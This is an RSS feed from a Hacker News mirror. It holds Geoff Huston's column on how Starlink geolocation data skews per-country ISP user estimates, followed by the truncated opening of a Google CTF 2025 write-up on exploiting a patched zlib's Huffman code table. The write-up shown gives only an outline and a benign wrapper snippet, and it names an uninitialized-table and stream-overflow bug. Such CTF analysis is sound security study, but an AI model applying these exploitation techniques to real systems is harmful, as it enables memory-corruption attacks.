<?xml version='1.0' encoding='UTF-8'?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><id>hnrss.org/frontpage</id><title>Hacker News: Front Page</title><updated>2025-09-30T16:43:02.916523+00:00</updated><link href="https://news.ycombinator.com/" rel="alternate"/><link href="https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml" rel="self"/><generator uri="https://lkiesow.github.io/python-feedgen" version="1.0.0">python-feedgen</generator><subtitle>Hacker News RSS</subtitle><entry><id>https://news.ycombinator.com/item?id=45422514</id><title>Geolocation and Starlink</title><updated>2025-09-30T16:43:10.499083+00:00</updated><content>&lt;doc fingerprint="5d409b51bb6528cb"&gt;
  &lt;main&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;p&gt;The ISP Column&lt;/p&gt;
          &lt;p&gt; A column on various things Internet&lt;/p&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row/&gt;
    &lt;/table&gt;
    &lt;p&gt; Geolocation and Starlink &lt;lb/&gt; September 2025 &lt;/p&gt;
    &lt;p&gt;"Where are you?" is not an easy question to answer on the Internet. The telephone system's address plan embedded a certain amount of physical location information in the fixed line network, and a full E.164 telephone number indicated your location in terms of your country, and your area within that country. The Internet did not adopt a geographic address plan which means that you're going to need a lot of additional information if you want to map an IP address into a location at the level of a country or a city.&lt;/p&gt;
    &lt;p&gt;Creating and maintaining such collections of geolocation data that maps IP addresses to a geolocation presents some challenges. Even a basic question, such as "How are you going to represent a location?" has a variety of answers. One could use latitude and longitude, but this has its own complications. What if you just wanted to map addresses into countries? You need a representation of a political map to translate these coordinates into a country. Or you could avoid these multiple layers of indirection and simply map IP addresses into countries. However, once you start referring to countries you run into a new set of questions, starting with the most basic ones of "What's a country?" and "What's a uniform way of naming them?" Thankfully these are not novel questions, and we can leverage the work of others to provide some answers here. These is the group that maintains the ISO 3166 standard, published by the International Organization for Standardisation that enumerates a list of codes of countries and dependant territories, using both 2 letter codes, three letter codes and three-digit numeric codes, all maintained by the imaginatively named "ISO 3166 Maintenance Agency," a group of 15 voting experts. There is also the United Nations Statistics Division, a body that maintains a number of related lists, including the "official" name of each country, a collection of numeric codes for each defined country, and a definition of a set of regions (groups of countries or groups of regions).&lt;/p&gt;
    &lt;p&gt;Why are these geolocation databases useful? There are obvious uses in the ongoing fight against various form of cyber-attacks, trying to de-anonymise the identity and location of the attacker. This information is also used in attempting to enforce various intellectual property rights that are often assigned to rights holders on a country-by-country basis. And then there are statistical reports. Countries like to compare themselves to others. But even simple questions, such as "How many Internet users are in each country?" are challenging to answer without the underlying seed data of a geolocation database.&lt;/p&gt;
    &lt;p&gt;There are a number of such IP address-to-location databases out there, but most are either private or only accessible on a subscription basis. In the research world many researchers have opted for the databases that are more generally available, and at APNIC labs for AP address-to-country mappings we rely on Maxmind and ipinfo.io. for this information.&lt;/p&gt;
    &lt;p&gt;The Regional Internet Registries also publish a two-letter country code in their IP number resource reports, and they are often used as a surrogate for IP-to-country mappings, but the data quality is low when assessed for quality as a source of geolocation information.&lt;/p&gt;
    &lt;p&gt;The reason why is based on differing assumptions between the data recording function of the RIRs and the needs of the geolocation function. The RIRs record the country of the principal office of the entity that was the recipient of the resource assignment. It does not record where these address and AS numbers are actually deployed on the Internet. In many cases, where an entity operates within a single country or economy, the RIR-recorded country code corresponds with the country where the associated addresses are being used. In other cases, where the IP addresses and AS numbers are used in other countries, the RIRs provide no indication that this is the case for these number resources. Also, the granularity of the data in the RIR registry is at a level of allocation, but when an assigned address block is divided up by an address holder and used in multiple countries there is no ability in the RIR data recording formation to track this internal subdivision and diverse deployment.&lt;/p&gt;
    &lt;p&gt;In general, it's not part of the RIRs' role to track where these number resources are being deployed. The RIRs' interest lies in accurately tracking who is assigned an address, and not where that address is being used.&lt;/p&gt;
    &lt;p&gt;At APNIC Labs we have been investigating if the collection of data that we have assembled as part of the measurement work can be used to track the ISP market share within each national economy. We are interested in trying to measure the effective level of inter-ISP competition within each national economy. The base of this derived competition measurement is a notional count of end users that are served by each ISP that operates in a national economy.&lt;/p&gt;
    &lt;p&gt;The measurement process starts with the estimated current population in each country. The data we use is sourced from the United Nations Population Division. We use the mid-year population estimate from 2024 and apply the 2023-2024 growth rate to the period from mid 2024 to the present day to get an estimate of the current population of each country for this day.&lt;/p&gt;
    &lt;p&gt;The second data set we use is the proportion of the population of each country that are classed as Internet users. There are three possible sources for this data, the World Bank, the International Telecommunications Union (ITU) and the CIA World Factbook. We use the ITU data by preference, but we cross check with the other two data sources for correlation..&lt;/p&gt;
    &lt;p&gt;The combination of these data sets gives us an estimate of the current Internet user population per country. It should be noted that this is not the number of âsubscriptionsâ to a service, as it attempts to include the number of users behind each subscription. It also is supposed to avoid âdouble countingâ, so where a user is part of a broadband service and also has a mobile service, then the user is still only counted once as an âInternet userâ.&lt;/p&gt;
    &lt;p&gt;The third component of the data is the ad presentation data of the APNIC measurement program. We use Google Ads to deliver some 35M individual ad impressions per day. We use a geolocation database to map each user who received an ad impression to a country, and use a local default-free BGP routing table to also map each user to their "home" network. At this point we have now assembled a set of "home" networks (origin AS numbers) and the geo-located country for each presented ad.&lt;/p&gt;
    &lt;p&gt;In this work we are making some pretty sweeping assumptions. These assumptions are somewhat questionable, but we've been forced to make them in the absence of generally available per-country data that is published by all countries in a timely and mutually consistent manner.&lt;/p&gt;
    &lt;p&gt;The first assumption is that Google's ad placement algorithms apply to all users within a given country uniformly. In defining the ad campaigns, we attempt to make the placement definitions as generic as possible, so that within each country the ad placements are roughly equivalent to a random sampling drawn from all users in that country. The implication of this assumption is that if an ISP has twice the number of users than another ISP in the same country, then its users will receive twice the number of ad impressions. This could be stated as: "The distribution of ad placement and the distribution of users across ISPs within any country are assumed to correlate."&lt;/p&gt;
    &lt;p&gt;The second assumption is that each user uses a single ISP for Internet access. This is not necessarily the case. For example, a user may use a local mobile service provider for their mobile Internet access and Starlink for their broadband access. We also have a user in their workplace using their workplace's ISP and using a consumer ISP when they are at home. These days many users have multiple mobile connections, and it is unclear how these multiple access methods correlate to ad placement, and through that to our measurements. The conclusion is that we canât account for such situations and in uniquely assigning each user to a single ISP in a country we tend to underestimate the user count for each ISP in consequence.&lt;/p&gt;
    &lt;p&gt;Due to the uncertainties that follow from these two major assumptions, the results we generate have an inevitable level of uncertainty. Some individual comparisons of this data against other sources where we have access to ISP market share data in individual countries point to an overall level of uncertainty of up to 15% or so in our estimates of users per ISP. Large consumer ISPs are still reported as having a large user population in the generated data, but the data for small networks is very uncertain.&lt;/p&gt;
    &lt;p&gt;The assumption of uniform distribution of ad placements across all ISPs within each country tends to fail where the number of placed ads in relation to the per-country user population is low. The best current example of this can be seen with the Russian Federation, where ad placement in this country has plummeted since February 2023 (a consequence of the hostilities between the Russian Federation and the Ukraine and associated western sanctions being placed on Russia).&lt;/p&gt;
    &lt;p&gt;Another general assumption is that all users exist within a country. This assumption does not necessarily hold for users on international flights using onboard Internet services, nor for ships at sea. In general, this factor should be insignificant for this exercise, given that as a proportion of the world's 5 billion users (or thereabouts!) this category of users is very small and should not distort the results to any significant extent beyond the already noted estimate of a 15% uncertainty. But this general assessment does not hold when the ISP in question operates a service that is not constrained to any single country, such as a satellite-based service. Even so, when the satellite service operates as a wholesale service and provides connections as a service to ISPs, then this is not relevant to this form of measurement. If an ISP provides service in a country using IP addresses that are assigned to that ISP, then the conventional geolocation function will still provide usable results. The situation is different when the satellite operator provides its own retail services, using IP addresses that have been assigned to that satellite operator. This is the case for Starlink.&lt;/p&gt;
    &lt;p&gt;The basic assumption here is that all IP addresses are used within a national realm. But this is not necessarily the case with users who are connected by a satellite service. What is the country when the IP service is provided to a ship on the high seas?&lt;/p&gt;
    &lt;p&gt;There are always exceptions to any generalisation, and some country views that are generated in this manner just stretch credibility too far.&lt;/p&gt;
    &lt;p&gt;Take Yemen, for example. A country with an estimated population of 10M people and 3.4M Internet users. The method described above gave the following result at the end of September:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="8"&gt;
        &lt;cell role="head"&gt;Visible ASNS: Custimer Populations (Est.)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="8"&gt;
        &lt;cell&gt;Date: 22/09/2025&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="8"&gt;
        &lt;cell&gt;Rank&lt;/cell&gt;
        &lt;cell&gt;ASN&lt;/cell&gt;
        &lt;cell&gt;AS Name&lt;/cell&gt;
        &lt;cell&gt;CC&lt;/cell&gt;
        &lt;cell&gt;Users (est.)&lt;/cell&gt;
        &lt;cell&gt;% of country&lt;/cell&gt;
        &lt;cell&gt;% of Internet&lt;/cell&gt;
        &lt;cell&gt;Samples&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="8"&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;AS14593&lt;/cell&gt;
        &lt;cell&gt;SPACEX-STARLINK&lt;/cell&gt;
        &lt;cell&gt;YE&lt;/cell&gt;
        &lt;cell&gt;6,233,929&lt;/cell&gt;
        &lt;cell&gt;59.22&lt;/cell&gt;
        &lt;cell&gt;0.14&lt;/cell&gt;
        &lt;cell&gt;321,186&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="8"&gt;
        &lt;cell&gt;2&lt;/cell&gt;
        &lt;cell&gt;AS30873&lt;/cell&gt;
        &lt;cell&gt;PTC-YMENNET&lt;/cell&gt;
        &lt;cell&gt;YE&lt;/cell&gt;
        &lt;cell&gt;3,350,708&lt;/cell&gt;
        &lt;cell&gt;31.83&lt;/cell&gt;
        &lt;cell&gt;0.08&lt;/cell&gt;
        &lt;cell&gt;172,636&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="8"&gt;
        &lt;cell&gt;3&lt;/cell&gt;
        &lt;cell&gt;AS204317&lt;/cell&gt;
        &lt;cell&gt;ADENNET&lt;/cell&gt;
        &lt;cell&gt;YE&lt;/cell&gt;
        &lt;cell&gt;910,655&lt;/cell&gt;
        &lt;cell&gt;8.65&lt;/cell&gt;
        &lt;cell&gt;0.02&lt;/cell&gt;
        &lt;cell&gt;46,919&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;4&lt;/cell&gt;
        &lt;cell&gt;AS13335&lt;/cell&gt;
        &lt;cell&gt;CLOUDFLARENET&lt;/cell&gt;
        &lt;cell&gt;YE&lt;/cell&gt;
        &lt;cell&gt;28,647&lt;/cell&gt;
        &lt;cell&gt;0.27&lt;/cell&gt;
        &lt;cell&gt;0.01&lt;/cell&gt;
        &lt;cell&gt;1,467&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;This measurement result for Starlink in Yemen is dubious at best. It has been generated because over the past 60 days some 321,000 measurement advertisements originated from IP addresses that have been assigned to Starlink and Starlink's geodatabase geolocates these addresses to Yemen. The other three services providers appear to be the incumbent telco, Yemen Net, and a local ISP in Aden, Aden Net. The Cloudflare measurement is likely due to a combination of the local use of Apple's Private Data Relay and the Cloudflare's Warp product. Together, these three providers accounted for some 210,000 ad presentations over the same period. The result is that the algorithm we use assigned some 6M users in Yemen (or 60% of the countryâs Internet user population) to Starlink!&lt;/p&gt;
    &lt;p&gt;What factors might be at play here that would contribute to this anomalous result?&lt;/p&gt;
    &lt;p&gt;One potential factor is the volume of shipping in the Red Sea. These days it appears that the use of Starlink at sea is pretty much pervasive. A Starlink service is evidently a faster and cheaper communications service than that provided by Inmarsat and it has truly global reach. Given that the Starlink geolocatation data attempts to map every Starlink IP address into one country or another, even ships at sea using Starlink get assigned an IP address that is mapped to some piece of land. Some 60 ships a day use the Suez Canal, and while the transit time from the Indian Ocean to the mediterranean sea is a few days, it's still a stretch to claim that shipping crew use of Starlink services alone accounts for some 50,000 ad impressions per day. These numbers imply that the use of Starlink by shipping may be part of the factors at play here, but it may not be the only contributary factor.&lt;/p&gt;
    &lt;p&gt;Another potential factor is that it's possible that Starlink's geolocation data does not reflect reality. The Starlink availability map indicates that Starlink has obtained national regulatory approval to operate in Yemen, Oman, Qatar, Bahrain, Israel, Jordan and Somalia, but not in Saudi Arabia, Egypt, Sudan, Eritrea, and Ethiopia. There have been persistent stories in a number of markets of Starlink resellers that set up a service in a country that has the necessary national regulatory approvals to use Starlink and then they ship the dish to a nearby location in a different country. It's an open question as to the extent this is taking place, and if so then it's certainly plausible to guess that users in Saudi Arabia are using Starlink services that are registered in Yemen.&lt;/p&gt;
    &lt;p&gt;Does Yemen really have 6M Starlink users? That is extremely unlikely. How many Starlink users is the country likely to have? In neighbouring Oman, Starlink has a far more modest 0.08% market share, according to this same measurement technique. I would be surprised if the actual figure for in-country Yemen users is all that different. For the Yemen data, the high number might well be the result of a high count of Starlink-using passing maritime traffic being attributed to Yemen, and also some component of cross-country usage from perhaps Saudi Arabia and the United Arab Emirates, nearby countries where Starlink appears not to have local regulatory approval as yet.&lt;/p&gt;
    &lt;p&gt;Are there other countries with a similar problem of apparent over-representation of Starlink users? The ad placement data, assigned to countries using the Starlink geolocatation data maps to 152 countries. In 21 instances, listed in Table 1, Starlink is used in more than 10% of the ad placement volumes, which looks to be somewhat questionable.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="6"&gt;
        &lt;cell role="head"&gt;CC&lt;/cell&gt;
        &lt;cell role="head"&gt;Cover?&lt;/cell&gt;
        &lt;cell role="head"&gt;Ads&lt;/cell&gt;
        &lt;cell role="head"&gt;Est. Users&lt;/cell&gt;
        &lt;cell role="head"&gt;% Users&lt;/cell&gt;
        &lt;cell role="head"&gt;CC Name&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;SJ&lt;/cell&gt;
        &lt;cell&gt;Y&lt;/cell&gt;
        &lt;cell&gt;726&lt;/cell&gt;
        &lt;cell&gt;0&lt;/cell&gt;
        &lt;cell&gt;100%&lt;/cell&gt;
        &lt;cell&gt;Svalbard and Jan Mayen Islands&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;BL&lt;/cell&gt;
        &lt;cell&gt;Y&lt;/cell&gt;
        &lt;cell&gt;620&lt;/cell&gt;
        &lt;cell&gt;6,008&lt;/cell&gt;
        &lt;cell&gt;98%&lt;/cell&gt;
        &lt;cell&gt;Saint Barthelemy&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;TV&lt;/cell&gt;
        &lt;cell&gt;Y&lt;/cell&gt;
        &lt;cell&gt;7,980&lt;/cell&gt;
        &lt;cell&gt;5,799&lt;/cell&gt;
        &lt;cell&gt;92%&lt;/cell&gt;
        &lt;cell&gt;Tuvalu&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;KI&lt;/cell&gt;
        &lt;cell&gt;Y&lt;/cell&gt;
        &lt;cell&gt;42,234&lt;/cell&gt;
        &lt;cell&gt;1,7955&lt;/cell&gt;
        &lt;cell&gt;81%&lt;/cell&gt;
        &lt;cell&gt;Kiribati&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;PN&lt;/cell&gt;
        &lt;cell&gt;Y&lt;/cell&gt;
        &lt;cell&gt;16&lt;/cell&gt;
        &lt;cell&gt;19&lt;/cell&gt;
        &lt;cell&gt;72%&lt;/cell&gt;
        &lt;cell&gt;Pitcairn&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;YE&lt;/cell&gt;
        &lt;cell&gt;Y&lt;/cell&gt;
        &lt;cell&gt;321,673&lt;/cell&gt;
        &lt;cell&gt;6,256,291&lt;/cell&gt;
        &lt;cell&gt;59%&lt;/cell&gt;
        &lt;cell&gt;Yemen&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;NR&lt;/cell&gt;
        &lt;cell&gt;Y&lt;/cell&gt;
        &lt;cell&gt;6,864&lt;/cell&gt;
        &lt;cell&gt;4,071&lt;/cell&gt;
        &lt;cell&gt;56%&lt;/cell&gt;
        &lt;cell&gt;Nauru&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;CK&lt;/cell&gt;
        &lt;cell&gt;Y&lt;/cell&gt;
        &lt;cell&gt;16,220&lt;/cell&gt;
        &lt;cell&gt;4,802&lt;/cell&gt;
        &lt;cell&gt;50%&lt;/cell&gt;
        &lt;cell&gt;Cook Islands&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;MH&lt;/cell&gt;
        &lt;cell&gt;Y&lt;/cell&gt;
        &lt;cell&gt;7,857&lt;/cell&gt;
        &lt;cell&gt;7,805&lt;/cell&gt;
        &lt;cell&gt;34%&lt;/cell&gt;
        &lt;cell&gt;Marshall Islands&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;SS&lt;/cell&gt;
        &lt;cell&gt;Y&lt;/cell&gt;
        &lt;cell&gt;60,296&lt;/cell&gt;
        &lt;cell&gt;369,566&lt;/cell&gt;
        &lt;cell&gt;32%&lt;/cell&gt;
        &lt;cell&gt;South Sudan&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;MF&lt;/cell&gt;
        &lt;cell&gt;Y&lt;/cell&gt;
        &lt;cell&gt;1,412&lt;/cell&gt;
        &lt;cell&gt;4,468&lt;/cell&gt;
        &lt;cell&gt;24%&lt;/cell&gt;
        &lt;cell&gt;Saint Martin&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;VU&lt;/cell&gt;
        &lt;cell&gt;Y&lt;/cell&gt;
        &lt;cell&gt;214&lt;/cell&gt;
        &lt;cell&gt;22,423&lt;/cell&gt;
        &lt;cell&gt;22%&lt;/cell&gt;
        &lt;cell&gt;Vanuatu&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;NE&lt;/cell&gt;
        &lt;cell&gt;Y&lt;/cell&gt;
        &lt;cell&gt;140,318&lt;/cell&gt;
        &lt;cell&gt;1,076,585&lt;/cell&gt;
        &lt;cell&gt;21%&lt;/cell&gt;
        &lt;cell&gt;Niger&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;SD&lt;/cell&gt;
        &lt;cell&gt;N&lt;/cell&gt;
        &lt;cell&gt;348,986&lt;/cell&gt;
        &lt;cell&gt;3,517,776&lt;/cell&gt;
        &lt;cell&gt;19%&lt;/cell&gt;
        &lt;cell&gt;Sudan&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;TD&lt;/cell&gt;
        &lt;cell&gt;Y&lt;/cell&gt;
        &lt;cell&gt;78,690&lt;/cell&gt;
        &lt;cell&gt;292,985&lt;/cell&gt;
        &lt;cell&gt;17%&lt;/cell&gt;
        &lt;cell&gt;Chad&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;ZW&lt;/cell&gt;
        &lt;cell&gt;Y&lt;/cell&gt;
        &lt;cell&gt;311,093&lt;/cell&gt;
        &lt;cell&gt;801,754&lt;/cell&gt;
        &lt;cell&gt;15%&lt;/cell&gt;
        &lt;cell&gt;Zimbabwe&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;SB&lt;/cell&gt;
        &lt;cell&gt;Y&lt;/cell&gt;
        &lt;cell&gt;9,916&lt;/cell&gt;
        &lt;cell&gt;14,946&lt;/cell&gt;
        &lt;cell&gt;14%&lt;/cell&gt;
        &lt;cell&gt;Solomon Islands&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;MM&lt;/cell&gt;
        &lt;cell&gt;N&lt;/cell&gt;
        &lt;cell&gt;237,004&lt;/cell&gt;
        &lt;cell&gt;2,899,276&lt;/cell&gt;
        &lt;cell&gt;14%&lt;/cell&gt;
        &lt;cell&gt;Myanmar&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;FM&lt;/cell&gt;
        &lt;cell&gt;Y&lt;/cell&gt;
        &lt;cell&gt;9,824&lt;/cell&gt;
        &lt;cell&gt;6,164&lt;/cell&gt;
        &lt;cell&gt;14%&lt;/cell&gt;
        &lt;cell&gt;Micronesia&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="6"&gt;
        &lt;cell&gt;MG&lt;/cell&gt;
        &lt;cell&gt;Y&lt;/cell&gt;
        &lt;cell&gt;67,755&lt;/cell&gt;
        &lt;cell&gt;612,408&lt;/cell&gt;
        &lt;cell&gt;12%&lt;/cell&gt;
        &lt;cell&gt;Madagascar&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;TO&lt;/cell&gt;
        &lt;cell&gt;Y&lt;/cell&gt;
        &lt;cell&gt;4,881&lt;/cell&gt;
        &lt;cell&gt;5,304&lt;/cell&gt;
        &lt;cell&gt;11%&lt;/cell&gt;
        &lt;cell&gt;Tonga&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;In the case of Svalbard other geolocation databases geolocate to Norway, whereas only the Starlink data set uses the SJ two-letter country code.&lt;/p&gt;
    &lt;p&gt;Saint Barthelmy, located in the Caribbean, is an overseas âcollectivityâ of France, with a population of some 9,000 people. Its former status was a commune as a part of Guadeloupe. While the Starlink geolocation database distinguishes between Guadeloupe and Saint Barthelmy, it appears that other databases do not draw a distinction between the two, hence the very high proportion of as placement in this country.&lt;/p&gt;
    &lt;p&gt;It is likely that the relatively high numbers of Starlink ad presentations in Tuvalu, Kiribati, Cook Islands. Marshall Islands, Saint Martin, Vanuatu, the Solomon Islands and Micronesia are due to shipping and yachting traffic. The relatively low GDP per capita in these island nations would tend to indicate that Starlink services are unaffordable by such high percentages of the domestic population.&lt;/p&gt;
    &lt;p&gt;Starlink operates a Community Gateway service in Naru, and a traceroute to the IP address prefixes announced by this ISP (Cenpac, AS 5722) reveals a Starlink connection, presumably using inter-satellite laser link. The connections using Starlinkâs own IP addresses are presumably not part of Cenpac service, and these are likely to be an anomaly, presumably due to global roaming used by ships at sea. An examination of the routing tab le shows similar community gateways have been deployed for the Tuvalu Telecommunications Corporation in Tuvalu, Tamaani in Northern Quebec in Canada and the for the Federated States of Micronesia Telecommunications Corporation.&lt;/p&gt;
    &lt;p&gt;It's also possible that these additional ad placements could include an aircraft element, as there have been reports of Starlink selling a mobile access service to aircraft in flight, but as with ships at sea there is no published data on the uptake of this class of Starlink users.&lt;/p&gt;
    &lt;p&gt;There are a number of other anomalies in Table 1. Sudan and Myanmar both have a high ad placement rate, yet the Starlink access map indicates that the Starlink service is not available in either of these countries. If that is the case, then why does the Starlink geo data have IP address entries for both of these countries and why are so many ad placements being recorded from these IP addresses? In the case of Sudan, the Starlink gateway announcing these IP addresses is located in Mombasa in Keyna, and for Myanmar the relevant Starlink Gateway is located in Singapore. There are also high counts of ad placements for Starlink services that geolocate to Zimbabwe, Niger and Chad. The situation in the Cook Islands is potentially relevant here, where prior to regulatory approval to operate in the Cook Islands it was reported that domestic enterprises and some users were purchasing a Starlink service in New Zealand under a Roam Unlimited plan, and then shipping the equipment to the Cook Islands. There is no regulatory approval for Starlink to operate in South Africa, Namiba, Angola, and all of the countries in northern Africa and much of western Africa, and itâs likely that there is a similar use of Starlinkâs roaming services to circumvent these local regulatory issues and purchase a roaming service elsewhere and use in in these countries.&lt;/p&gt;
    &lt;p&gt;For 20 of these 21 countries (the sole exception appears to be Pitcairn Islands) itâs highly likely that the inferred level of use of Starlink within these countries is inflated by these factors, and the resultant view of the domestic ISP market is skewed as a result.&lt;/p&gt;
    &lt;p&gt;The rise of the use of satellite services for these global roaming services raises some basic questions about IP geolocation and its role.&lt;/p&gt;
    &lt;p&gt;Is this about the end user's precise physical location on the surface of the planet? Or is this about the national boundaries we've drawn on this surface, and assigning every user into one of these countries? In this case do we need to use a new geolocation code (or codes) for locations at sea? Is "at sea" defined by the conventional 12 nautical mile sea boundary? Or is some other interpretation of a margin where a country has a territorial sea claim?&lt;/p&gt;
    &lt;p&gt;What about ships in international waters? The conventional approach to ships at sea assert that the ship and its crew are subject to the laws of its flag state in international waters. What about aircraft in flight? It might appear that a similar situation to ships at sea may apply to aircraft in flight over international space, but a more commonly applied convention (the Tokyo Convention) is that the laws of the country of aircraft registration apply to an aircraft in flight for international flights irrespective of the location of the aircraft at any point.&lt;/p&gt;
    &lt;p&gt;So, what is the geolocation of the occupants of that ship or flight when accessing the Internet?&lt;/p&gt;
    &lt;p&gt;There is a deeper assumption here concerning the behaviour of IP addresses. Does it even make sense to statically assign a geographic location to an IP address when the addressed device is in motion? What are the motivations for performing the location attribute assignment, and how can we implement the dynamic nature of such an assignment? There are no clear unambiguous answers to such questions, and perhaps that ambiguity reflects a common uncertainty that there is no clearly defined purpose for geolocation assignment in the first place.&lt;/p&gt;
    &lt;p&gt;At APNIC Labs we've decided to override the Starlink geolocation data that refers to the 20 countries listed above and instead assign an âunclassifiedâ designation to this part of the Starlink geolocation data.&lt;/p&gt;
    &lt;p&gt;Itâs not exactly a satisfying response to the problem, but it stops the distortion of the national measurements due to the increasing levels of usage of these satellite-based services for Internet access.&lt;/p&gt;
    &lt;p&gt;The above views do not necessarily represent the views of the Asia Pacific Network Information Centre.&lt;/p&gt;
    &lt;p&gt;The author was one of two liaisons from the IETF to the RSS GWG. The views expressed here are his personal views and are not endorsed by anyone else!&lt;/p&gt;
    &lt;p&gt;&lt;lb/&gt; GEOFF HUSTON AM, M.Sc., is the Chief Scientist at APNIC, the Regional Internet Registry serving the Asia Pacific region.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.potaroo.net/ispcol/2025-09/starlinkgeo.html"/><published>2025-09-30T06:23:31+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45422653</id><title>Google CTF 2025 – webz : Exploiting zlib's Huffman Code Table</title><updated>2025-09-30T16:43:08.719627+00:00</updated><content>&lt;doc fingerprint="ee9112fdb84841d9"&gt;
  &lt;main&gt;&lt;quote&gt;&lt;p&gt;한국어: https://velog.io/@0range1337/CTF-Google-CTF-2025-webz-Exploiting-zlibs-Huffman-Code-Table&lt;/p&gt;&lt;/quote&gt;&lt;code&gt;1. Overview
2. Background
	2-1. google-zlib-Increase-Huffman-Table-Size.patch
	2-2. Deflate Algorithm
		2-2-1. LZ77
		2-2-2. Huffman Coding
3. Code Analysis
	3-1. Inflate
	3-2. Huffman Table
	3-3. Decode
4. Vulnerability
	4-1. Unintialized Huffman Code Table
	4-2. Exploiting inflate_fast
    	4-2-1. Integer Overflow (Unexploitable)
    	4-2-2. PoC
        4-2-3. Stream Overflow (Exploitable)
    	4-2-4. PoC
5. Exploit&lt;/code&gt;&lt;p&gt;&lt;code&gt;webz&lt;/code&gt; is a zlib exploitation challenge from Google CTF 2025. The Google-zlib implementation provided in the challenge is not upstream; it’s a version with an arbitrary patch applied. Whereas typical open‑source exploit challenges ship a patch that clearly introduces a vulnerability, &lt;code&gt;webz&lt;/code&gt;’s Google-zlib patch appears—at first glance—to be a normal optimization.&lt;/p&gt;&lt;p&gt;In practice, the vulnerability in this Google-zlib can be found quickly via fuzzing. However, in this write‑up we’ll derive the precise root cause through source analysis.&lt;/p&gt;&lt;p&gt;The Google-zlib codebase isn’t large, but it is quite tricky. Because it implements compression algorithms, manipulates data at the bit level, and contains optimizations that sacrifice readability, analysis can be difficult.&lt;/p&gt;&lt;code&gt;// webz.c:L114
    int ret = inflateInit2(&amp;amp;webz_state.infstream, -15);
    webz_state.infstream.msg = webz_state.ok_status;

    if (ret != Z_OK) {
        printf("Error: inflateInit failed: %d\n", ret);
        return;
    }

    ret = inflate(&amp;amp;webz_state.infstream, Z_NO_FLUSH);

    if (ret != Z_STREAM_END) {
        printf("Error: inflate failed: %d\n", ret);
        inflateEnd(&amp;amp;webz_state.infstream);
        return;
    }

    inflateEnd(&amp;amp;webz_state.infstream);&lt;/code&gt;&lt;quote&gt;&lt;code&gt;// zlib.h\:L570 /\* windowBits can also be -8..-15 for raw deflate. In this case, -windowBits determines the window size. deflate() will then generate raw deflate data with no zlib header or trailer, and will not compute a check value. \*/&lt;/code&gt;&lt;/quote&gt;&lt;p&gt;First, let’s look at the provided &lt;code&gt;webz.c&lt;/code&gt;. It’s simply a wrapper around Google-zlib. It receives raw Deflate-compressed data from the user and decompresses it using Google-zlib’s &lt;code&gt;inflate&lt;/code&gt;. Therefore, we must identify vulnerabilities in the code that implements &lt;code&gt;inflate&lt;/code&gt;: &lt;code&gt;inflate.c&lt;/code&gt;, &lt;code&gt;inftrees.c&lt;/code&gt;, and &lt;code&gt;inffast.c&lt;/code&gt;.&lt;/p&gt;&lt;quote&gt;&lt;item&gt;inflate.c&lt;/item&gt;&lt;lb/&gt;The core of the&lt;code&gt;inflate&lt;/code&gt;implementation. The&lt;code&gt;inflate&lt;/code&gt;function is a virtual finite-state machine, treating the given compressed data like opcodes for a virtual machine. As we’ll examine later, it processes compressed data in blocks.&lt;item&gt;inftrees.c&lt;/item&gt;&lt;lb/&gt;One of the compression techniques used in&lt;code&gt;Deflate&lt;/code&gt;is Huffman coding. To decode Huffman-coded data in the&lt;code&gt;inflate&lt;/code&gt;implementation, a Huffman table must be constructed;&lt;code&gt;inftrees.c&lt;/code&gt;contains that Huffman table construction code.&lt;item&gt;inffast.c&lt;/item&gt;&lt;code&gt;inffast.c&lt;/code&gt;contains&lt;code&gt;inflate_fast&lt;/code&gt;, a 